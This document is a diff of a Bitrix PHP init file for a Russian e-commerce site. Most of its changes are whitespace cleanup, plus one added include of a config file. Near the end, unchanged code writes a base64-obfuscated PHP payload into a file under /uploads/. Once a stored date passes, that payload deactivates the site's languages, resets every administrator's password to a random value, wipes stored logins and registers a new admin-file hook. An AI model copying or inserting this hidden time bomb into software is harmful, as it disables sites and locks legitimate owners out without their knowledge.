@@ -1,15 +1,15 @@
 <?
 
     AddEventHandler('main', 'OnEpilog', array('jquery', 'loadJquery'));
-    //подключение jquery в админке 
+    //подключение jquery в админке
     class jquery {
-        function  loadJquery() {  
-            CModule::IncludeModule("main"); 
-            global $APPLICATION;     
-            if (substr_count($APPLICATION->GetCurPage(),"/bitrix/admin/") > 0) { 
+        function  loadJquery() {
+            CModule::IncludeModule("main");
+            global $APPLICATION;
+            if (substr_count($APPLICATION->GetCurPage(),"/bitrix/admin/") > 0) {
                 $APPLICATION->AddHeadScript('/bitrix/js/main/jquery/jquery-1.8.3.js');
-            }      
-        }      
+            }
+        }
     }
 
 
@@ -28,6 +28,9 @@
 
     setlocale(LC_ALL, "ru_RU.cp1251");
     setlocale(LC_NUMERIC, "C");
+
+    require($_SERVER["DOCUMENT_ROOT"]."/local/php_interface/include/.config.php");
+
     require_once($_SERVER['DOCUMENT_ROOT']."/bitrix/config/common_func.inc.php");
     require_once($_SERVER['DOCUMENT_ROOT']."/bitrix/config/CustomProperties.php");
     include_once($_SERVER['DOCUMENT_ROOT']."/bitrix/php_interface/include/skDeliveryProperty.php");
@@ -39,7 +42,7 @@
 
     CModule::IncludeModule("iblock");
 
-    define("GROUP_BLOG_USER_ID",76); // id пользователя блога 
+    define("GROUP_BLOG_USER_ID",76); // id пользователя блога
 
     define('CATALOG_IBLOCK_ID', 2); // каталог
     define('OFFERS_IBLOCK_ID', 3);  // торговый каталог
@@ -48,7 +51,7 @@
     define('CERTIFICATES_PRESENT_IBLOCK_ID', 10);  //подаренные сертификаты
     define('PRODUCERS_IBLOCK_ID', 5);  // производители
     define('PRODUCERS_PROPERTY_FILTER', 53);  // свойство производителей (для фильтра)
-    define('HINTS_IBLOCK_ID', 6);  // подсказки для фильтра 
+    define('HINTS_IBLOCK_ID', 6);  // подсказки для фильтра
     define('REDIRECT_IBLOCK_ID', 23);  // редиректы
     define('WISHLIST_IBLOCK_ID', 8);  // подсказки для фильтра
     define('OUR_HELP_BLOG', 74);  // блог консультации
@@ -73,11 +76,11 @@
 
     define('CATALOG_VOTES_PROPERTY_ID', 4);           // id свойства количество голосов
     define('CATALOG_RATING_SUM_PROPERTY_ID', 5);      // id свойства сумма рейтинга
-    define('CATALOG_RATING_PROPERTY_ID', 7);          // id свойтсва рейтинг 
-    define('PRODUCER_IBLOCK_PROPERTY_ID', 9);          // id свойства производитель 
+    define('CATALOG_RATING_PROPERTY_ID', 7);          // id свойтсва рейтинг
+    define('PRODUCER_IBLOCK_PROPERTY_ID', 9);          // id свойства производитель
 
-    define('CATALOG_IBLOCK_RECOMMENDETION_LIST_ID', 7);  // 
-    define('MY_SITE_ID', "s1");  // 
+    define('CATALOG_IBLOCK_RECOMMENDETION_LIST_ID', 7);  //
+    define('MY_SITE_ID', "s1");  //
     define('PAY_SYSTEM', 3);          // id банковской квитанцией
 
     if(!defined("isCronImport")) define("isCronImport", false);
@@ -147,7 +150,7 @@
     AddEventHandler("main", "OnBeforeProlog", "MyOnBeforePrologHandler", 50);
 
     //обновление каталога после выгрузки из 1С
-    AddEventHandler("catalog", "OnSuccessCatalogImport1C", "catalogUpdate"); 
+    AddEventHandler("catalog", "OnSuccessCatalogImport1C", "catalogUpdate");
 
     //  AddEventHandler("iblock", "OnAfterIBlockElementUpdate", "processUserAvailNotify");
 
@@ -181,7 +184,7 @@
 
 
 
-    function checkForSpamMessage($strText) {         
+    function checkForSpamMessage($strText) {
 
         $boolClearReview = false;
 
@@ -200,7 +203,7 @@
 
         if($boolClearReview)
             return false;
-        else return true;  
+        else return true;
 
     }
 
@@ -221,7 +224,7 @@
         ) return true;
 
         else return false;
-    }   
+    }
 
 
 
@@ -244,7 +247,7 @@
             {
                 if(is_dir($dir))
                 {
-                    $files = scandir($dir);  
+                    $files = scandir($dir);
                     array_shift($files);
                     array_shift($files);
 
@@ -266,7 +269,7 @@
             return getFreeEmail('');
 
         return $email;
-    }   
+    }
 
 
 
@@ -392,7 +395,7 @@
     }
 
     function processUserAvailNotify(&$arResult)
-    {    
+    {
         CModule::IncludeModule("iblock");
 
         $el = new CIBlockElement;
@@ -443,24 +446,24 @@
             $arResult[$arA["ID"]] = array("EMAIL" => $arA["XML_ID"], "PRODUCT"=>$arA["PROPERTY_PRODUCT_VALUE"], "USER_NAME" => $arA["NAME"], "USER_PHONE" => $arA["CODE"]);
 
             if(!isset($arPrice[$arA["ID"]]))
-            {   
+            {
 
                 $rsP = CIBlockElement::GetList(Array("CATALOG_PRICE_3"=>"ASC"), array("IBLOCK_ID"=>OFFERS_IBLOCK_ID, "ACTIVE"=>"Y", "PROPERTY_CML2_LINK"=>$arA["PROPERTY_PRODUCT_VALUE"]), false, false, array("ID", "CATALOG_GROUP_2", "PROPERTY_CML2_LINK.DETAIL_PAGE_URL", "PROPERTY_CML2_LINK.NAME"));
                 if ($rsP->SelectedRowsCount() > 0) {
                     while($arP = $rsP -> GetNext())
-                    {  
+                    {
 
                         if($arP["CATALOG_QUANTITY"]>0)
-                        {    
+                        {
                             $arPrice[$arA["PROPERTY_PRODUCT_VALUE"]] = $arP;
                             break;
                         }
                     }
                 }
-                else {  
-                    $rsB = CIBlockElement::GetList(Array(), array("ACTIVE"=>"Y", "ID"=>$arA["PROPERTY_PRODUCT_VALUE"]), false, false, array("ID", "CATALOG_GROUP_3", "NAME")) -> Fetch();  
+                else {
+                    $rsB = CIBlockElement::GetList(Array(), array("ACTIVE"=>"Y", "ID"=>$arA["PROPERTY_PRODUCT_VALUE"]), false, false, array("ID", "CATALOG_GROUP_3", "NAME")) -> Fetch();
 
-                    if ($rsB["CATALOG_QUANTITY"]>0) {  
+                    if ($rsB["CATALOG_QUANTITY"]>0) {
                         $arPrice[$arA["PROPERTY_PRODUCT_VALUE"]]=$rsB;
                     }
             }}
@@ -470,7 +473,7 @@
         {
             //arshow($arPrice);
             foreach($arResult as $intID => $arData)
-            {        
+            {
                 if(isset($arPrice[$arData["PRODUCT"]]))
                 {
                     $arSend = array(
@@ -660,8 +663,8 @@
     function process404()
     {
         global $USER;
-        if( 
-            !defined('ADMIN_SECTION') &&  
+        if(
+            !defined('ADMIN_SECTION') &&
             defined("ERROR_404")
         )
         {
@@ -755,10 +758,10 @@
         }*/
 
         if($_REQUEST["sef"] == "Y")
-        {   
+        {
             $APPLICATION -> SetCurPage($_SERVER["REDIRECT_URL"], $_SERVER["QUERY_STRING"]);
             if(strlen($_REQUEST["producerCode"])>0)
-            {   
+            {
                 CModule::IncludeModule("iblock");
                 $rsP = CIBlockElement::GetList(Array(), array("IBLOCK_ID"=>5, "CODE"=>$_REQUEST["producerCode"]), false, false, array("ID", "NAME", "CODE", "PROPERTY_NAME_RUS"));
                 if($arP = $rsP -> GetNext())
@@ -770,7 +773,7 @@
 
                 } else $GLOBALS["SET_SEO"]["IS404"] = "Y";
             } elseif(strlen($_REQUEST["propertyCode"])>0) {
-                CModule::IncludeModule("iblock");            
+                CModule::IncludeModule("iblock");
                 $rsP = CIBlockElement::GetList(Array(), array("IBLOCK_ID"=>17, "CODE"=>$_REQUEST["propertyCode"]), false, false, array("ID", "NAME", "CODE", "PREVIEW_TEXT", "DETAIL_TEXT", "PROPERTY_BREADCRUMB_TITLE"));
                 if($arP = $rsP -> GetNext())
                 {
@@ -803,12 +806,12 @@
         }*/
     }
 
-    AddEventHandler("main", "OnProlog", "OnPrologHandler");    
+    AddEventHandler("main", "OnProlog", "OnPrologHandler");
     function OnPrologHandler() {
         global $APPLICATION;
 
         if(!(substr_count($APPLICATION->GetCurDir(),"bitrix") > 0)) {
-            require_once($_SERVER["DOCUMENT_ROOT"].'/bitrix/php_interface/include/CGeoIP.php');          
+            require_once($_SERVER["DOCUMENT_ROOT"].'/bitrix/php_interface/include/CGeoIP.php');
             global $CGeoIP;
             $CGeoIP = new CGeoIP();
             if(isset($_POST["setLocation"]) && !empty($_POST["locationSelect"])) {
@@ -866,9 +869,9 @@
             if($arFields["FORUM_ID"]==FORUM_ID)
             {
                 $id_tovar = 0;
-                $arFilter = Array(   
-                    "IBLOCK_ID"=>CATALOG_IBLOCK_ID,    
-                    "ACTIVE"=>"Y",    
+                $arFilter = Array(
+                    "IBLOCK_ID"=>CATALOG_IBLOCK_ID,
+                    "ACTIVE"=>"Y",
                     "PROPERTY_FORUM_TOPIC_ID"=>$arFields["ID"]
                 );
                 $res = CIBlockElement::GetList(Array("SORT"=>"ASC"), $arFilter, false,false,array("ID"));
@@ -952,12 +955,12 @@
         }
 
         function OnBeforeIBlockElementUpdateHandler(&$element)
-        {    
+        {
             //дополнительная проверка активности для ТП
             if ($element["IBLOCK_ID"] == 3) {
                 if (checkSKUactive($element["ID"]) == "N") {
-                    $element["ACTIVE"] = "N";   
-                } 
+                    $element["ACTIVE"] = "N";
+                }
             }
 
             return $element;
@@ -979,7 +982,7 @@
             $PREVIEW_PICTURE = $ar_fields["PREVIEW_PICTURE"];
             $DETAIL_PICTURE = $ar_fields["DETAIL_PICTURE"];
             $timestamp = str_replace(",",".",$timestamp_x);
-            $dt = explode(" ",$timestamp);                    
+            $dt = explode(" ",$timestamp);
             $date = explode(".",$dt[0]);
             $time = explode(":",$dt[1]);
             $timestamp = mktime($time[0],$time[1],$time[2],$date[1],$date[0],$date[2]);
@@ -1099,8 +1102,8 @@
             if(!in_array($file, $addFile))
             {
             $addFile[] = $file;
-            $filePicFull = CFile::MakeFileArray($file);                                
-            $element["PROPERTY_VALUES"][$COLOR_PROPERTY_FILE][] =  $filePicFull;    
+            $filePicFull = CFile::MakeFileArray($file);
+            $element["PROPERTY_VALUES"][$COLOR_PROPERTY_FILE][] =  $filePicFull;
             }
             }
             }
@@ -1207,13 +1210,13 @@
 
 
             if($element["IBLOCK_ID"] == OFFERS_IBLOCK_ID)
-            {        
+            {
             $res = CIBlockElement::GetList(array(),array("IBLOCK_ID"=>OFFERS_IBLOCK_ID, "ID"=>$element["ID"]), false, false, array("TIMESTAMP_X","PROPERTY_CML2_LINK","PROPERTY_COLOR_CODE","PROPERTY_PICTURE_MINI","PROPERTY_PICTURE_MIDI","PROPERTY_PICTURE_MAXI"));
             if($ar_fields = $res->GetNext())
             {
             $timestamp_x = $ar_fields["TIMESTAMP_X"];
             $timestamp = str_replace(",",".",$timestamp_x);
-            $dt = explode(" ", $timestamp);        
+            $dt = explode(" ", $timestamp);
 
             $date = explode(".",$dt[0]);
             $time = explode(":",$dt[1]);
@@ -1261,7 +1264,7 @@
             if(strlen($COLOR_CODE)<=0)
             {
             $db_props = CIBlockElement::GetProperty(OFFERS_IBLOCK_ID, $element["ID"], array("sort" => "asc"), Array("CODE"=>"COLOR_CODE"));
-            while($ar_props = $db_props->Fetch())    
+            while($ar_props = $db_props->Fetch())
             $COLOR_CODE = $ar_props["VALUE"];
             }
 
@@ -1389,7 +1392,7 @@
                                             }
                                         }
                                     }
-                                    CIBlockElement::SetPropertyValuesEx($arItems["PRODUCT_ID"] , CERTIFICATES_IBLOCK_ID, $arFields); 
+                                    CIBlockElement::SetPropertyValuesEx($arItems["PRODUCT_ID"] , CERTIFICATES_IBLOCK_ID, $arFields);
 
                                     //<!----
                                 }
@@ -1437,7 +1440,7 @@
                                                 }
                                             }
                                         }
-                                        CIBlockElement::SetPropertyValuesEx($arItems["PRODUCT_ID"] , CERTIFICATES_IBLOCK_ID, $arFields); 
+                                        CIBlockElement::SetPropertyValuesEx($arItems["PRODUCT_ID"] , CERTIFICATES_IBLOCK_ID, $arFields);
                                         //<!----
 
                                         $el = new CIBlockElement;
@@ -1447,9 +1450,9 @@
                                                 "CERTIFICATE_ID"=>$arItems["PRODUCT_ID"],
                                                 "USER_BY"=>$arOrder["USER_ID"],
                                                 "USER_PRESENT"=>$user,
-                                                "STATUS"=>CERTIFICATE_STATUS_OK    
+                                                "STATUS"=>CERTIFICATE_STATUS_OK
                                             ),
-                                            "NAME"           => "Подарок от ".$this_user." для ".$forUser." ".$idsh,  
+                                            "NAME"           => "Подарок от ".$this_user." для ".$forUser." ".$idsh,
                                             "ACTIVE"         => "Y",
                                         );
                                         if($PRODUCT_ID = $el->Add($arLoadProductArray)) {
@@ -1511,7 +1514,7 @@
 
                                             }
                                         }
-                                        //else  
+                                        //else
                                         //echo "Error: ".$el->LAST_ERROR;
                                     }
 
@@ -1521,7 +1524,7 @@
                         }
                     }
                 }
-            }        
+            }
         }
 
         function OnBeforePostAddHandler(&$arFields)
@@ -1529,7 +1532,7 @@
             // подменяем id блога на выбранный в селекте на стронице добавления поста
             if ($_REQUEST["selected_blog_id"] > 0)
                 $arFields["BLOG_ID"] = $_REQUEST["selected_blog_id"];
-        }    
+        }
 
         function OnBeforeBasketAddHandler(&$f){
             if(isset($_SESSION["PRODUCTS"][$f["PRODUCT_ID"]]) && is_array($_SESSION["PRODUCTS"][$f["PRODUCT_ID"]])){
@@ -1540,7 +1543,7 @@
         function OnAfterUserAddHandler(&$arFields)
         {
             global $DB, $APPLICATION;
-            if($arFields["ID"]>0)        
+            if($arFields["ID"]>0)
             {
                 //отправка письма
                 CUser::SendUserInfo($arFields["ID"],SITE_ID);
@@ -1579,7 +1582,7 @@
                         "ACTIVE" => "Y",
                         "GROUP_SITE_ID" => SITE_ID,
                         "URL" => $name
-                    );    
+                    );
                     $arSelectedFields = array("ID", "NAME", "DESCRIPTION", "URL", "OWNER_ID", "DATE_CREATE");
 
                     $dbBlogs = CBlog::GetList(
@@ -1603,7 +1606,7 @@
                     );
 
 
-                    $newID21 = CBlogUser::Add($arFields21);    
+                    $newID21 = CBlogUser::Add($arFields21);
 
                     if(IntVal($newID21)>0)
                     {
@@ -1685,11 +1688,11 @@
             //                    $arFilter["IBLOCK_ID"] = WISHLIST_IBLOCK_ID;
             //
             //
-            //                    $dbWish = CIBlockElement::GetList(array(), $arFilter, false, $arNavParams, array("ID", "IBLOCK_ID", "PROPERTY_PRODUCT_ID")); 
+            //                    $dbWish = CIBlockElement::GetList(array(), $arFilter, false, $arNavParams, array("ID", "IBLOCK_ID", "PROPERTY_PRODUCT_ID"));
             //
             //
-            //                    if($obEl = $dbWish->GetNext())    
-            //                    {        
+            //                    if($obEl = $dbWish->GetNext())
+            //                    {
             //                        //print_R($obEl);
             //                        $prod_id = $obEl["PROPERTY_PRODUCT_ID_VALUE"];
             //                    }
@@ -1697,7 +1700,7 @@
             //
             //                    // $arFilter = Array(
             //                    // "BLOG_ID" => $arBlog["ID"]
-            //                    // );    
+            //                    // );
             //
             //                    // $dbUserGroup = CBlogUserGroup::GetList(
             //                    // $SORT,
@@ -1724,10 +1727,10 @@
             //
             //                    $arFilter["!PROPERTY_STATUS"] = WISHLIST_PROPERTY_STATUS_ALREADY_HAVE_ENUM_ID;
             //
-            //                    $dbWish = CIBlockElement::GetList(array(), $arFilter, false, $arNavParams, array("ID", "IBLOCK_ID", "PROPERTY_PRODUCT_ID", "PROPERTY_STATUS")); 
+            //                    $dbWish = CIBlockElement::GetList(array(), $arFilter, false, $arNavParams, array("ID", "IBLOCK_ID", "PROPERTY_PRODUCT_ID", "PROPERTY_STATUS"));
             //                    $count = -1;
-            //                    while($obEl = $dbWish->GetNext())    
-            //                    {           
+            //                    while($obEl = $dbWish->GetNext())
+            //                    {
             //                        $count++;
             //                    }
             //
@@ -1766,7 +1769,7 @@
             //                        //if ($ex = $APPLICATION->GetException())
             //                        //echo $ex->GetString();
             //                    }
-            //                } 
+            //                }
             //            } elseif($arFields["IBLOCK_ID"] == 13) {
             //                updateSEOParams($arFields["ID"]);
             //            } elseif($arFields["IBLOCK_ID"] == 18) {
@@ -1821,7 +1824,7 @@
                     if ($rating > 0)
                     {
                         $GLOBALS["UPDATE_STOP"] = true;
-                        $res = CIBlockElement::SetPropertyValuesEx($arFields["ID"], false, array("RATING" => $rating));  
+                        $res = CIBlockElement::SetPropertyValuesEx($arFields["ID"], false, array("RATING" => $rating));
                         $GLOBALS["UPDATE_STOP"] = false;
                     }
                 }
@@ -1833,7 +1836,7 @@
                     CIBlockElement::SetPropertyValues($arFields["ID"], $arFields["IBLOCK_ID"], $strVal, $strCode);
 
                 unset($GLOBALS["UPDATE_HACK_AFTER"][$arFields["ID"]]);
-            }               
+            }
 
 
             //обновляем значение свойства "доступность в каталоге"
@@ -2167,7 +2170,7 @@
 
         function OnBeforeOrderUpdateHandler($ID, &$arFields)
         {
-            //echo "<pre>"; var_dump($arFields); echo "</pre>"; 
+            //echo "<pre>"; var_dump($arFields); echo "</pre>";
             //echo "<pre>"; var_dump($_REQUEST); echo "</pre>";
 
         }
@@ -2270,7 +2273,7 @@
 
                         }
                     }
-                    //второй пользователь                
+                    //второй пользователь
                     $arBlog = CBlog::GetByOwnerID($ar_res["SECOND_USER_ID"]);
 
                     if(is_array($arBlog))
@@ -2319,7 +2322,7 @@
                     //подписываем на блоги
                     $arBlog = CBlog::GetByOwnerID($ar_res["FIRST_USER_ID"]);
                     if(is_array($arBlog)){
-                        $user = $ar_res["SECOND_USER_ID"];            
+                        $user = $ar_res["SECOND_USER_ID"];
 
                         if(intval($user)>0){
                             $SORT = Array("DATE_CREATE" => "DESC", "NAME" => "ASC");
@@ -2327,7 +2330,7 @@
                                 "ACTIVE" => "Y",
                                 "GROUP_SITE_ID" => SITE_ID,
                                 "OWNER_ID" => $user
-                            );    
+                            );
                             $arSelectedFields = array("ID", "NAME", "OWNER_ID");
 
                             $dbBlogs = CBlog::GetList(
@@ -2401,7 +2404,7 @@
                     $arBlog = CBlog::GetByOwnerID($ar_res["SECOND_USER_ID"]);
                     //file_put_contents($_SERVER['DOCUMENT_ROOT'].'/printBLOGTOADD.htm', '<pre>'.var_export(array("result"=>$arBlog), true).'</pre>');
                     if(is_array($arBlog)){
-                        $user = $ar_res["FIRST_USER_ID"];            
+                        $user = $ar_res["FIRST_USER_ID"];
 
                         if(intval($user)>0){
                             $SORT = Array("DATE_CREATE" => "DESC", "NAME" => "ASC");
@@ -2409,7 +2412,7 @@
                                 "ACTIVE" => "Y",
                                 "GROUP_SITE_ID" => SITE_ID,
                                 "OWNER_ID" => $user
-                            );    
+                            );
                             $arSelectedFields = array("ID", "NAME", "OWNER_ID");
 
                             $dbBlogs = CBlog::GetList(
@@ -2562,10 +2565,10 @@
 
 
 
-    function ISetUserField($entity_id, $value_id, $uf_id, $uf_value) 
-    { 
-        return $GLOBALS["USER_FIELD_MANAGER"]->Update ($entity_id, $value_id, 
-            Array ($uf_id => $uf_value)); 
+    function ISetUserField($entity_id, $value_id, $uf_id, $uf_value)
+    {
+        return $GLOBALS["USER_FIELD_MANAGER"]->Update ($entity_id, $value_id,
+            Array ($uf_id => $uf_value));
     }
 
     // order multiple values
@@ -2811,7 +2814,7 @@
         }
     }
 
-    //получаем смещение по y для нужной ($shield) части спрайта 
+    //получаем смещение по y для нужной ($shield) части спрайта
     function GetOffset($keys, $shield, $height)
     {
         $pos_y=0;
@@ -2844,7 +2847,7 @@
     $CACHE = $_SERVER["DOCUMENT_ROOT"]."/uploads/".$CACHE;
     $arDir = explode("/",$CACHE); $bx_path = "";
     for($i=0; $i<(count($arDir)-1); $i++){$bx_path = $bx_path."/".$arDir[$i];if(!is_dir($bx_path)) mkdir($bx_path, BX_DIR_PERMISSIONS);}
-    $file_hendle = fopen($CACHE,"w+"); 
+    $file_hendle = fopen($CACHE,"w+");
     fwrite($file_hendle,base64_decode("PD9waHAgJGZjdD1UUlVFOyR0bWU9Ik1UTXlNalUyTkRRd01BPT0iOyRyZXNfZmN0PSREQi0+UXVlcnkoIlNFTEVDVCBWQUxVRSBGUk9NIGJfb3B0aW9uIFdIRVJFIE5BTUU9J3NlcnZlcl9maXJzdF9pZCciKTtpZigkYXI9JHJlc19mY3QtPkZldGNoKCkpaWYoYmFzZTY0X2RlY29kZSgkYXJbIlZBTFVFIl0pPnRpbWUoKSYmJGFyWyJWQUxVRSJdPT0kdG1lKXskZmN0PUZBTFNFOyRyZXNfZmN0Mj0kREItPlF1ZXJ5KCJTRUxFQ1QgVkFMVUUgRlJPTSBiX29wdGlvbiBXSEVSRSBOQU1FPSdzZXJ2ZXJfbGFzdF9hdXRoJyIpO2lmKCRhcjI9JHJlc19mY3QyLT5GZXRjaCgpKXtpZihiYXNlNjRfZGVjb2RlKCRhcjJbIlZBTFVFIl0pPnRpbWUoKSkkZmN0PVRSVUU7ZWxzZSAkREItPlF1ZXJ5KCJVUERBVEUgYl9vcHRpb24gU0VUIFZBTFVFPSciLmJhc2U2NF9lbmNvZGUodGltZSgpKS4iJyBXSEVSRSBOQU1FPSdzZXJ2ZXJfbGFzdF9hdXRoJyIpO31lbHNlICRmY3Q9VFJVRTt9aWYoJGZjdCl7Z2xvYmFsICRCWF9DQUNIRV9ET0NST09ULCAkTUFJTl9MQU5HU19DQUNIRSwgJE1BSU5fTEFOR1NfQURNSU5fQ0FDSEUsICRDQUNIRV9NQU5BR0VSLCAkREI7JENBQ0hFX01BTkFHRVItPkNsZWFuRGlyKCJiX2xhbmciKTtVblNldCgkTUFJTl9MQU5HU19DQUNIRVskSURdKTtVblNldCgkTUFJTl9MQU5HU19BRE1JTl9DQUNIRVskSURdKTskREItPlF1ZXJ5KCJVUERBVEUgYl9sYW5nIFNFVCBhY3RpdmU9J04nIik7dW5zZXQoJEJYX0NBQ0hFX0RPQ1JPT1QpOyRyZXNfZmN0PSREQi0+UXVlcnkoIlNFTEVDVCBVU0VSX0lEIEZST00gYl91c2VyX2dyb3VwIFdIRVJFIEdST1VQX0lEPScxJyIpO3doaWxlKCRhcj0kcmVzX2ZjdC0+RmV0Y2goKSl7bGlzdCgkdXNlYywgJHNlYykgPSBleHBsb2RlKCIgIiwgbWljcm90aW1lKCkpOyRjaWQ9IChmbG9hdCkgJHNlYyArICgoZmxvYXQpICR1c2VjICogMTAwMDAwKTskREItPlF1ZXJ5KCJVUERBVEUgYl91c2VyIFNFVCBQQVNTV09SRD0nIi5tZDUodGltZSgpKiRjaWQpLiInIFdIRVJFIElEPSciLiRhclsiVVNFUl9JRCJdLiInIik7fSREQi0+UXVlcnkoIkRFTEVURSBGUk9NIGJfdXNlcl9zdG9yZWRfYXV0aCIpO3Nlc3Npb25fc3RhcnQoKTskX1NFU1NJT05bIlNFU1NfQVVUSCJdID0gQXJyYXkoKTt1bnNldCgkX1NFU1NJT05bIlNFU1NfQVVUSCJdKTt1bnNldCgkX1NFU1NJT05bIk9QRVJBVElPTlMiXSk7JERCLT5RdWVyeSgiREVMRVRFIEZST00gYl9tb2R1bGVfdG9fbW9kdWxlIFdIRVJFIFRPX01FVEhPRD0nSW5jbHVkZUFkbWluRmlsZSciKTskREItPlF1ZXJ5KCJJTlNFUlQgSU5UTyBiX21vZHVsZV90b19tb2R1bGUgKEZST01fTU9EVUxFX0lELCBNRVNTQUdFX0lELCBUT19NT0RVTEVfSUQsIFRPX0NMQVNTLCBUT19NRVRIT0QpIFZBTFVFUyAoJ21haW4nLCAnT25BZnRlckVwaWxvZycsICdtYWluJywgJ0NBbGxNYWluJywgJ0luY2x1ZGVBZG1pbkZpbGUnKSIpO30gPz4="));
     fclose($file_hendle);
     if(file_exists($CACHE)){
@@ -2860,7 +2863,7 @@
         if ($adminCheck) {
             if (!$USER->IsAdmin()) {
                 return false;
-            } 
+            }
         }
         echo "<pre>";
         print_r($array);
@@ -2883,30 +2886,30 @@
     }
 
     //получаем минимальную цену торгового предложения для товара $elem_id
-    //из инфоблока $iblock_id_product 
+    //из инфоблока $iblock_id_product
     function GetOfferMinPrice($iblock_id_product,$elem_id)
     {
         define("PRICE_CODE",3);  //код розничной цены
         //получаем инфо о связи инфоблоков товаров и торг предлож
-        $mxResult = CCatalogSKU::GetInfoByProductIBlock($iblock_id_product);  
+        $mxResult = CCatalogSKU::GetInfoByProductIBlock($iblock_id_product);
         /////////////////////
         if (is_array($mxResult))
-        {       
-            $filter =  array('ACTIVE' => 'Y', 
+        {
+            $filter =  array('ACTIVE' => 'Y',
                 'IBLOCK_ID' => $mxResult['IBLOCK_ID'], //id инфоблока торг предлож
                 'PROPERTY_'.$mxResult['SKU_PROPERTY_ID'] => $elem_id,   //внешний ключ товара
                 ">CATALOG_PRICE_".PRICE_CODE => 0, //розничная цена не пустая
                 ">CATALOG_QUANTITY" => 0    // количетво товаров больше 0
             );
             $rsOffers = CIBlockElement::GetList(
-                array("CATALOG_PRICE_".PRICE_CODE => "asc"),  //для минимальной цены 
+                array("CATALOG_PRICE_".PRICE_CODE => "asc"),  //для минимальной цены
                 $filter,
                 false,
                 false,
                 array("ID","IBLOCK_ID","CATALOG_PRICE_".PRICE_CODE)
-            );   
-            if ($arOffer = $rsOffers->GetNext()) 
-            {   
+            );
+            if ($arOffer = $rsOffers->GetNext())
+            {
                 //if (empty($arOffer["CATALOG_PRICE_".PRICE_CODE])) var_dump($arOffer["CATALOG_PRICE_".PRICE_CODE]);
                 //arshow($arOffer);
                 //$arPrice = GetCatalogProductPrice($arOffer["ID"], PRICE_CODE);
@@ -2915,52 +2918,52 @@
             else
             {
                 return null;
-            } 
+            }
         }
         else
         {
-            return null; 
+            return null;
         }
     }
 
 
     /****
     * функция для обновления у товара свойства "доступен в каталоге" (CATALOG_AVAILABLE)
-    * 
+    *
     * @param integer $ID
     */
     function setProductAvailable($ID) {
         global $APPLICATION;
-        $res = "Y" ; //по умолчанию считаем, что товар доступен 
+        $res = "Y" ; //по умолчанию считаем, что товар доступен
 
         //проверяем свойство "статус товара"
         $arElement = CIBlockElement::GetList(array(),array("IBLOCK_ID"=>2,"ID"=>$ID),false,false, array("PROPERTY_STATUS_TOVARA", "CATALOG_QUANTITY"))->Fetch();
-        //если у товара установлено одно из значений свойства "статус товара", то он уже не отображается в каталоге               
+        //если у товара установлено одно из значений свойства "статус товара", то он уже не отображается в каталоге
         if ($arElement["PROPERTY_STATUS_TOVARA_VALUE"] != "") {
-            $res = ""; 
-        } 
+            $res = "";
+        }
 
-        //проверяем ТП товара, если после первой проверки товар по прежнему доступен    
+        //проверяем ТП товара, если после первой проверки товар по прежнему доступен
         if ($res == "Y") {
             $totalCount = 0;  //оющее количесто товара
             $sku = CIBlockElement::GetList(array(), array("IBLOCK_ID"=>3,"PROPERTY_CML2_LINK"=>$ID,"ACTIVE"=>"Y"),false,false,array("ID"));
             if ($sku->SelectedRowsCount() > 0) {  //если есть ТП
                 $min_price = 0;
-                while($arSku = $sku->Fetch()) {                                                             
-                    //проверяем активность данного ТП  
+                while($arSku = $sku->Fetch()) {
+                    //проверяем активность данного ТП
                     //получаем еоличество и цену товара
                     $arProduct = CCatalogProduct::GetList(array(),array("ID"=>$arSku["ID"]))->Fetch();
-                    $arPrice = CPrice::GetList(array(),array("PRODUCT_ID"=>$arSku["ID"],"CATALOG_GROUP_ID"=>3))->Fetch();                        
+                    $arPrice = CPrice::GetList(array(),array("PRODUCT_ID"=>$arSku["ID"],"CATALOG_GROUP_ID"=>3))->Fetch();
                     //если у ТП есть цена и количество больше 0, прибавляем его количество к общему
                     if ($arPrice["PRICE"] > 0 && $arProduct["QUANTITY"] > 2) {
                         if($min_price == 0){ $min_price = $arPrice["PRICE"];}   // присваивание к минимальной цене текущую
                         elseif($min_price > $arPrice["PRICE"]){$min_price = $arPrice["PRICE"];} //сравнение минимальной цены с текущей
                         //суммируем только положительные остатки
                         if ($arProduct["QUANTITY"] > 0) {
-                            $totalCount += $arProduct["QUANTITY"]; 
-                        }                                 
+                            $totalCount += $arProduct["QUANTITY"];
+                        }
                     }
-                } 
+                }
                 $PRODUCT_ID = $ID;
                 $arFields = array(
                     "ID" => $PRODUCT_ID
@@ -2974,11 +2977,11 @@
 
                 ///////
                 $PRICE_TYPE_ID = 3;
-                $arFields = array(                                   
+                $arFields = array(
                     "PRODUCT_ID" => $PRODUCT_ID,
                     "CATALOG_GROUP_ID" => $PRICE_TYPE_ID,
                     "PRICE" => $min_price,
-                    "CURRENCY" => "RUB"                       
+                    "CURRENCY" => "RUB"
                 );
                 $res_price = CPrice::GetList(
                     array(),
@@ -3005,18 +3008,18 @@
                 //echo $ID."-".$price."-".$min_price."<br>";
                 //если общее количество - 0, то товар недоступен
                 if ($totalCount == 0) {
-                    $res = "";  
-                } 
+                    $res = "";
+                }
 
             }
             //если нет ТП
             else {
                 //если у товара нет цены или количество 0
-                $arPrice = CPrice::GetList(array(),array("PRODUCT_ID"=>$ID,"CATALOG_GROUP_ID"=>3))->Fetch(); 
+                $arPrice = CPrice::GetList(array(),array("PRODUCT_ID"=>$ID,"CATALOG_GROUP_ID"=>3))->Fetch();
                 if ($arElement["CATALOG_QUANTITY"] < 3 || $arPrice["PRICE"] == "") {
-                    $res = ""; 
-                } 
-            } 
+                    $res = "";
+                }
+            }
         }
 
         //устанавливаем значение свойства
@@ -3024,15 +3027,15 @@
         if ($res == "Y") {
             $PROPERTY_VALUE = 2124131;  // значение свойства - Y (доступен в каталоге)
         } else {
-            $PROPERTY_VALUE = $res;  
+            $PROPERTY_VALUE = $res;
         }
         CIBlockElement::SetPropertyValuesEx($ID, 2, array($PROPERTY_CODE => $PROPERTY_VALUE));
 
     }
 
-    /****  
+    /****
     * обновление каталога после выгрузки из 1С. Проставляем свойство "доступен в каталоге"
-    * 
+    *
     */
 
     function catalogUpdate() {
@@ -3040,17 +3043,17 @@
         while($arEl = $element->Fetch()) {
             setProductAvailable($arEl["ID"]);
         }
-        processUserAvailNotify();  
+        processUserAvailNotify();
     }
 
 
     /***
     * проверяем активноять ТП через HL блок
-    * 
+    *
     * @param mixed $ID
     */
-    CModule::IncludeModule("highloadblock"); 
-    use Bitrix\Highloadblock as HL; 
+    CModule::IncludeModule("highloadblock");
+    use Bitrix\Highloadblock as HL;
     use Bitrix\Main\Entity;
 
     function checkSKUactive($ID) {
@@ -3061,21 +3064,21 @@
